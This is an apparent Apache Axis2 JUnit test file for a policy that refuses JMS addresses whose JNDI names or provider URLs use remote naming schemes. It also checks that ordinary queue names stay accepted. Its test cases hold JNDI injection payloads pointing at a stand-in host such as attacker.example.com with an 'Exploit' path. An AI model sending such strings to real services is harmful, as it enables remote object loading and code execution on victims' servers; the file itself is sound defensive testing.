/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements. See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership. The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License. You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied. See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
package org.apache.axis2.transport.jms;

import junit.framework.TestCase;

/**
 * A JMS address becomes JNDI lookups, and JNDI resolves a name carrying a remote
 * naming scheme through that scheme's URL context factory, which can fetch and
 * deserialise a remote object. These tests pin which addresses are refused, and --
 * just as importantly -- which are not: the guard this replaced (AXIS2-6062) searched
 * the whole address for substrings and refused ordinary destination names that
 * happened to contain one.
 */
public class JMSTargetAddressPolicyTest extends TestCase {

    private void assertRefused(String address) {
        String reason = JMSTargetAddressPolicy.rejectionReason(address);
        assertNotNull("must be refused: " + address, reason);
    }

    private void assertAccepted(String address) {
        String reason = JMSTargetAddressPolicy.rejectionReason(address);
        assertNull("must be accepted: " + address + " (refused because " + reason + ")",
                reason);
    }

    /** The destination name is a JNDI URL, so the lookup leaves the broker entirely. */
    public void testRemoteSchemeAsDestinationNameIsRefused() {
        assertRefused("jms:/ldap://attacker.example.com:1389/Exploit");
        assertRefused("jms:/rmi://attacker.example.com:1099/Exploit");
        assertRefused("jms:/LDAP://attacker.example.com/Exploit");
        assertRefused("jms:/iiopname://attacker.example.com/Exploit");
        assertRefused("jms:/corbaname:iiop:attacker.example.com#x");
        assertRefused("jms:/dns://attacker.example.com/x");
    }

    public void testRemoteSchemeAsReplyDestinationIsRefused() {
        assertRefused("jms:/Queue?transport.jms.ReplyDestination=ldap://attacker.example.com/x");
    }

    /** The provider URL decides where every name resolves, including plain ones. */
    public void testRemoteSchemeAsProviderUrlIsRefused() {
        assertRefused("jms:/Queue?java.naming.provider.url=ldap://attacker.example.com:1389");
        assertRefused("jms:/Queue?java.naming.provider.url=rmi://attacker.example.com:1099");
    }

    /**
     * The false positives the substring guard produced. A queue called "alarming"
     * contains RMI; "dns-events" contains DNS. These are ordinary names and must work.
     */
    public void testOrdinaryNamesContainingSchemeSubstringsAreAccepted() {
        assertAccepted("jms:/alarming");
        assertAccepted("jms:/dns-events");
        assertAccepted("jms:/PersonRMIQueue");
        assertAccepted("jms:/jmx-metrics?transport.jms.DestinationType=topic");
    }

    public void testOrdinaryJmsAddressesAreAccepted() {
        assertAccepted("jms:/ReplyQueue");
        assertAccepted("jms:/java:comp/env/jms/MyQueue");
        assertAccepted("jms:/Queue?java.naming.provider.url=tcp://broker.internal:61616");
        assertAccepted("jms:/Queue?transport.jms.ReplyDestination=ResponseQueue");
    }

    public void testNonJmsAndNullAddressesAreLeftAlone() {
        assertAccepted(null);
        assertAccepted("http://example.com/service");
    }
}
